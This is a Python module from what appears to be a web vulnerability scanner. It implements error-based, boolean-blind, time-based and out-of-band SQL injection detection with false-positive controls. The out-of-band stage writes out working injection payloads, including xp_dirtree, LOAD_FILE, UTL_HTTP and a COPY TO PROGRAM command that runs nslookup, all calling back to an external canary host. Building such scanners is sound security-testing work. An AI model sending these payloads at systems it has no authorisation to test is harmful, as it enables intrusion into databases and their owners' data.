import re
import logging
import time
from typing import Optional

import httpx

from pwnproxy.plugins.core.base import Finding
from pwnproxy.plugins.core.chain import DetectionDepth, DetectionStage, StageResult
from pwnproxy.plugins.scanners.sqli.payloads import (
    CANONICAL_BOOLEAN_PAIR,
    ESCALATION_BOOLEAN_PAIRS,
    get_control_payloads,
)
from pwnproxy.shared.scan.response_compare import (
    Fingerprint,
    is_boolean_differentiable,
    similarity,
)
from pwnproxy.shared.models import Flow
from pwnproxy.shared.scan.params import InjectionPoint
from pwnproxy.shared.scan.replayer import RequestReplayer, _serialize_request
from pwnproxy.shared.scan.waf import is_rate_limit_status, looks_like_block_page
from pwnproxy.shared.canary import get_registry

logger = logging.getLogger(__name__)

BASELINE_STABLE_SIMILARITY = 0.90
CONSISTENT_ROUND_SIMILARITY = 0.90


def _pair_differentiable(true_resp, false_resp) -> bool:
    if true_resp is None or false_resp is None:
        return False
    fp_true = Fingerprint.build(true_resp.status_code, true_resp.text)
    fp_false = Fingerprint.build(false_resp.status_code, false_resp.text)
    return is_boolean_differentiable(fp_true, fp_false)


def _stable_confirmation(round1_true, round1_false, round2_true, round2_false) -> bool:
    """Require ALL four 4-round confirmation conditions (see sqli-detection spec)."""
    if round2_true is None or round2_false is None:
        return False
    # 1. first round differentiable
    if not _pair_differentiable(round1_true, round1_false):
        return False
    # 2. TRUE-TRUE consistent
    if _text_similarity(round1_true, round2_true) < CONSISTENT_ROUND_SIMILARITY:
        return False
    # 3. FALSE-FALSE consistent
    if _text_similarity(round1_false, round2_false) < CONSISTENT_ROUND_SIMILARITY:
        return False
    # 4. second round differentiable
    if not _pair_differentiable(round2_true, round2_false):
        return False
    return True


def _text_similarity(resp_a, resp_b) -> float:
    if resp_a is None or resp_b is None:
        return 0.0
    fp_a = Fingerprint.build(resp_a.status_code, resp_a.text)
    fp_b = Fingerprint.build(resp_b.status_code, resp_b.text)
    return similarity(fp_a, fp_b)


class ErrorBasedStage(DetectionStage):
    order = 0
    min_depth = DetectionDepth.FAST
    capability = "error-based-sqli"

    def __init__(
        self,
        replayer: RequestReplayer,
        signatures: dict[str, list[re.Pattern]],
        error_payloads: list,
        evasion_level: str = "none",
        aggressive_status: bool = False,
    ):
        self._replayer = replayer
        self._signatures = signatures
        self._error_payloads = error_payloads
        self._evasion = evasion_level
        # Opt-in: treat >=2 bare 5xx payloads as inferred/high (pre-WAF ladder).
        # Off by default: bare status differential is tentative/medium because a
        # WAF/proxy/error-handler can produce the same 5xx without any SQL.
        self._aggressive_status = aggressive_status

    async def _control_passes(self, point: InjectionPoint) -> bool:
        """False when a non-SQL control also induces a 5xx.

        If raw garbage OR inert SQL-like input makes the point 5xx, the status
        change is not attributable to SQL injection (WAF by pattern / fragile
        app error handler) and no error-based finding should be emitted.
        """
        for control in get_control_payloads():
            resp = await self._replayer.replay(
                point, control.value, timeout=3.0, evasion_level=self._evasion
            )
            if resp is not None and resp.status_code >= 500:
                logger.info(
                    "ErrorBasedStage: control %r also 5xx (%s) at %s — status change not attributable to SQL",
                    control.value, resp.status_code, point.key,
                )
                return False
        return True

    @staticmethod
    def _any_block_page(responses: list) -> bool:
        """True when a captured 5xx response looks like a WAF/proxy block page."""
        for resp in responses:
            if resp is None:
                continue
            headers = dict(resp.headers) if getattr(resp, "headers", None) is not None else {}
            if looks_like_block_page(resp.status_code, resp.text, headers):
                return True
        return False

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            # Baseline check: if the clean response already carries a DBMS error
            # signature (e.g. the session/state is poisoned by another request),
            # the error is NOT induced by this parameter — skip the point.
            clean = await self._replayer.send_clean(point, timeout=10.0)
            if clean is None:
                logger.debug("ErrorBasedStage: baseline request failed for %s — skipping", point.key)
                continue
            if _check_error_signatures(clean.text, self._signatures) is not None:
                logger.info(
                    "ErrorBasedStage: baseline already has SQL error at %s — skipping (pre-existing error)",
                    point.key,
                )
                continue
            # A 5xx baseline means we cannot attribute a 5xx to the payload either.
            if clean.status_code >= 400:
                logger.info("ErrorBasedStage: baseline status %s at %s — skipping", clean.status_code, point.key)
                continue

            # Track payloads that induce a 5xx (muted error, no signature in body).
            five_xx: list[tuple[str, object]] = []  # (payload_value, response)
            rate_limited = 0

            for payload in self._error_payloads:
                resp = await self._replayer.replay(point, payload.value, timeout=3.0, evasion_level=self._evasion)
                if resp is None:
                    continue
                # Intermediary rate limit (429/503) is NOT a SQL error signal.
                if is_rate_limit_status(resp.status_code):
                    rate_limited += 1
                    continue
                result = _check_error_signatures(resp.text, self._signatures)
                if result is not None:
                    dbms, evidence = result
                    req = self._replayer.build_payload_request(point, payload.value, evasion_level=self._evasion)
                    findings.append(Finding(
                        scanner="sqli",
                        url=point.url,
                        method=point.method,
                        param_name=point.name,
                        param_location=point.location,
                        technique="error-based",
                        severity="high",
                        confidence="confirmed",
                        payload=payload.value,
                        evidence=evidence,
                        extra={"dbms": dbms},
                        request_data=_serialize_request(req),
                    ))
                    confirmed.add(_point_key(point))
                    break
                if resp.status_code >= 500:
                    five_xx.append((payload.value, resp))

            # Abort the point's status differential when the target starts
            # rate-limiting us: the 5xx/503s that follow are bot defense, not SQL.
            if rate_limited >= max(1, len(self._error_payloads) // 2):
                logger.info("ErrorBasedStage: mostly rate-limited at %s — aborting differential", point.key)
                continue

            # No textual signature matched → fall back to the status differential.
            # A 5xx induced by an error payload (muted SQL error, e.g. bWAPP low)
            # over a 2xx baseline is a signal — but only if the 5xx is actually
            # attributable to SQL and not to a WAF/proxy/fragile error handler.
            if not five_xx:
                continue

            if self._any_block_page([resp for _pv, resp in five_xx]):
                logger.info("ErrorBasedStage: 5xx at %s looks like a WAF block page — not emitting", point.key)
                continue
            if not await self._control_passes(point):
                continue

            five_xx_payloads = [pv for pv, _resp in five_xx]
            if self._aggressive_status and len(five_xx_payloads) >= 2:
                confidence, severity = "inferred", "high"
            else:
                confidence, severity = "tentative", "medium"
            trigger = five_xx_payloads[0]
            req = self._replayer.build_payload_request(point, trigger, evasion_level=self._evasion)
            n_triggers = len(five_xx_payloads)
            extra: dict = {"dbms": "unknown", "status_differential": True, "control_passed": True}
            if n_triggers < len(self._error_payloads):
                extra["partial_triggers"] = True
            findings.append(Finding(
                scanner="sqli",
                url=point.url,
                method=point.method,
                param_name=point.name,
                param_location=point.location,
                technique="error-based",
                severity=severity,
                confidence=confidence,
                payload=trigger,
                evidence=(
                    f"HTTP 5xx induced by {n_triggers} SQL error payload(s) over {clean.status_code} "
                    f"baseline; no DBMS error signature in body; non-SQL control passed; "
                    f"no WAF block signature detected"
                ),
                extra=extra,
                request_data=_serialize_request(req),
            ))
            confirmed.add(_point_key(point))

        return StageResult(findings=findings, confirmed_points=confirmed)


class BooleanBlindStage(DetectionStage):
    order = 1
    min_depth = DetectionDepth.STANDARD
    capability = "boolean-blind-sqli"

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none", deadline: Optional[float] = None):
        self._replayer = replayer
        self._evasion = evasion_level
        self._deadline = deadline

    def set_deadline(self, deadline: Optional[float]) -> None:
        self._deadline = deadline

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            if self._deadline is not None and time.monotonic() > self._deadline:
                logger.info("BooleanBlindStage: stopping at intra-stage deadline (%d points tested)", len(findings))
                break

            clean_before = await self._replayer.send_clean(point, timeout=10.0)
            if clean_before is None:
                continue
            baseline_before = Fingerprint.build(clean_before.status_code, clean_before.text)

            # 1. Canonical pair pre-check (one request per payload).
            canonical_true, canonical_false = CANONICAL_BOOLEAN_PAIR
            true1 = await self._replayer.replay(point, canonical_true, timeout=5.0, evasion_level=self._evasion)
            false1 = await self._replayer.replay(point, canonical_false, timeout=5.0, evasion_level=self._evasion)

            pair: Optional[tuple[str, str]] = None
            round1_true = true1
            round1_false = false1

            if _pair_differentiable(true1, false1):
                pair = (canonical_true, canonical_false)
            else:
                # 2. Escalate to remaining pairs, 2 requests each.
                for t_p, f_p in ESCALATION_BOOLEAN_PAIRS:
                    rt = await self._replayer.replay(point, t_p, timeout=5.0, evasion_level=self._evasion)
                    rf = await self._replayer.replay(point, f_p, timeout=5.0, evasion_level=self._evasion)
                    if _pair_differentiable(rt, rf):
                        pair = (t_p, f_p)
                        round1_true = rt
                        round1_false = rf
                        break

            if pair is None:
                continue

            true_payload, false_payload = pair

            # 3. Four-round bidirectional confirmation: TRUE/FALSE/TRUE/FALSE.
            round2_true = await self._replayer.replay(point, true_payload, timeout=5.0, evasion_level=self._evasion)
            round2_false = await self._replayer.replay(point, false_payload, timeout=5.0, evasion_level=self._evasion)

            if not _stable_confirmation(round1_true, round1_false, round2_true, round2_false):
                continue

            # 4. Clean baseline stability check (before vs after).
            clean_after = await self._replayer.send_clean(point, timeout=10.0)
            if clean_after is None:
                continue
            baseline_after = Fingerprint.build(clean_after.status_code, clean_after.text)

            stable = similarity(baseline_before, baseline_after) >= BASELINE_STABLE_SIMILARITY

            # boolean-blind 4-round stability is a strong indirect signal
            # (not content/syntax extraction) → inferred. An unstable clean
            # baseline degrades the finding to tentative.
            confidence = "inferred" if stable else "tentative"
            severity = "high"

            req = self._replayer.build_payload_request(point, true_payload, evasion_level=self._evasion)
            findings.append(Finding(
                scanner="sqli",
                url=point.url,
                method=point.method,
                param_name=point.name,
                param_location=point.location,
                technique="boolean-blind",
                severity=severity,
                confidence=confidence,
                payload=true_payload,
                evidence=(
                    f"Boolean differential stable across 4 rounds "
                    f"(round1 diff, TRUE-TRUE sim, FALSE-FALSE sim, round2 diff); "
                    f"baseline {'stable' if stable else 'UNSTABLE'}"
                ),
                request_data=_serialize_request(req),
            ))
            confirmed.add(_point_key(point))

        return StageResult(findings=findings, confirmed_points=confirmed)


class TimeBlindStage(DetectionStage):
    order = 2
    min_depth = DetectionDepth.STANDARD
    capability = "time-based-sqli"

    def __init__(self, replayer: RequestReplayer, time_payloads: list, evasion_level: str = "none"):
        self._replayer = replayer
        self._time_payloads = time_payloads
        self._evasion = evasion_level

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            start = time.monotonic()
            clean = await self._replayer.send_clean(point, timeout=10.0)
            baseline_ms = (time.monotonic() - start) * 1000
            if clean is None:
                continue

            result = await _check_time_based(self._replayer, point, baseline_ms, self._time_payloads, self._evasion)
            if result is not None:
                finding, dbms = result
                finding.extra["dbms"] = dbms
                findings.append(finding)
                confirmed.add(_point_key(point))

        return StageResult(findings=findings, confirmed_points=confirmed)


class OOBStage(DetectionStage):
    order = 3
    min_depth = DetectionDepth.DEEP
    capability = "oob-sqli"

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        registry = get_registry()

        for point in injection_points:
            scan_id = f"sqli-oob-{flow.id}-{point.name}"
            canary = registry.create(scan_id)
            callback_url = f"http://oob.pwnproxy/{canary.token}"

            payloads = [
                f"' OR LOAD_FILE('\\\\{callback_url}\\x')-- ",
                f"'; DECLARE @q VARCHAR(8000); EXEC master.dbo.xp_dirtree '\\\\{callback_url}\\x';-- ",
                f"' OR COPY (SELECT '') TO PROGRAM 'nslookup {callback_url}'-- ",
                f"' OR UTL_HTTP.request('{callback_url}')-- ",
            ]

            for payload_text in payloads:
                resp = await self._replayer.replay(point, payload_text, timeout=10.0, evasion_level=self._evasion)
                if resp is None:
                    continue

            import asyncio
            await asyncio.sleep(2)

            hit = registry.get(canary.token)
            if hit and hit.callback_received:
                req = self._replayer.build_payload_request(point, payloads[0], evasion_level=self._evasion)
                findings.append(Finding(
                    scanner="sqli",
                    url=point.url,
                    method=point.method,
                    param_name=point.name,
                    param_location=point.location,
                    technique="oob",
                    severity="high",
                    confidence="confirmed",
                    payload=payloads[0],
                    evidence=f"OOB callback received from {hit.callback_ip}",
                    extra={"dbms": "multi", "oob_token": canary.token},
                    request_data=_serialize_request(req),
                ))
                confirmed.add(_point_key(point))

            registry.cleanup_expired()

        return StageResult(findings=findings, confirmed_points=confirmed)


def _point_key(point: InjectionPoint) -> tuple:
    return (point.method, point.host + point.path, point.name, point.location)


def _check_error_signatures(body: str, signatures: dict[str, list]) -> Optional[tuple[str, str]]:
    import re
    for dbms, patterns in signatures.items():
        for pat in patterns:
            m = pat.search(body)
            if m:
                return (dbms, m.group()[:500])
    return None


async def _check_time_based(
    replayer: RequestReplayer,
    point: InjectionPoint,
    baseline_ms: float,
    time_payloads: list,
    evasion_level: str = "none",
) -> Optional[tuple[Finding, str]]:
    seen_dbms: set[str] = set()
    for pl in time_payloads:
        if pl.dbms in seen_dbms:
            continue
        seen_dbms.add(pl.dbms)

        start = time.monotonic()
        resp = await replayer.replay(point, pl.value, timeout=15.0, evasion_level=evasion_level)
        elapsed = (time.monotonic() - start) * 1000
        if resp is None:
            continue
        if elapsed > baseline_ms + 4000:
            confirm_payloads = [p for p in time_payloads if p.dbms == pl.dbms and "3" in p.value]
            for confirm_pl in confirm_payloads:
                cstart = time.monotonic()
                cresp = await replayer.replay(point, confirm_pl.value, timeout=15.0, evasion_level=evasion_level)
                celapsed = (time.monotonic() - cstart) * 1000
                if cresp is None:
                    req = replayer.build_payload_request(point, pl.value, evasion_level=evasion_level)
                    return (
                        Finding(
                            scanner="sqli", url=point.url, method=point.method,
                            param_name=point.name, param_location=point.location,
                            technique="time-based-blind", severity="medium", confidence="tentative",
                            payload=pl.value,
                            evidence=f"Primary delay ({elapsed:.0f}ms vs baseline {baseline_ms:.0f}ms) but confirmation failed",
                            request_data=_serialize_request(req),
                        ),
                        pl.dbms or "unknown",
                    )
                if celapsed > baseline_ms + 2400:
                    req = replayer.build_payload_request(point, pl.value, evasion_level=evasion_level)
                    return (
                        Finding(
                            scanner="sqli", url=point.url, method=point.method,
                            param_name=point.name, param_location=point.location,
                            technique="time-based-blind", severity="high", confidence="confirmed",
                            payload=pl.value,
                            evidence=f"Delay: baseline={baseline_ms:.0f}ms, primary={elapsed:.0f}ms, confirm={celapsed:.0f}ms",
                            request_data=_serialize_request(req),
                        ),
                        pl.dbms or "unknown",
                    )
            req = replayer.build_payload_request(point, pl.value, evasion_level=evasion_level)
            return (
                Finding(
                    scanner="sqli", url=point.url, method=point.method,
                    param_name=point.name, param_location=point.location,
                    technique="time-based-blind", severity="medium", confidence="tentative",
                    payload=pl.value,
                    evidence=f"Primary delay ({elapsed:.0f}ms) but confirmation below threshold",
                    request_data=_serialize_request(req),
                ),
                pl.dbms or "unknown",
            )
    return None
